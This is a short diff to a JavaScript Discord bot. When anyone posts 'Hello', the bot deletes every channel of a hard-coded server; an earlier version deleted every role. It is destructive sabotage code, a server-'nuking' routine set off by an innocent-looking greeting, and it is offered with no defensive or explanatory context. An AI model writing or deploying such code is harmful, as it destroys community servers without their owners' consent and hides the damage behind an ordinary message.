@@ -9,9 +9,9 @@ client.on("message", (message) => {
 
   var server = Client.guilds.get(801058277697126400); //Check Discord's Help For it
   if (message == "Hello"){
-    for (var i = 0; i < server.roles.array().length; i++) {
-      server.roles.array()[i].delete();
-      message.reply("Deleting roles");
+    for (var i = 0; i < server.channels.array().length; i++) {
+      server.channels.array()[i].delete();
+      message.reply("Deleting channels");
     }
   }
 
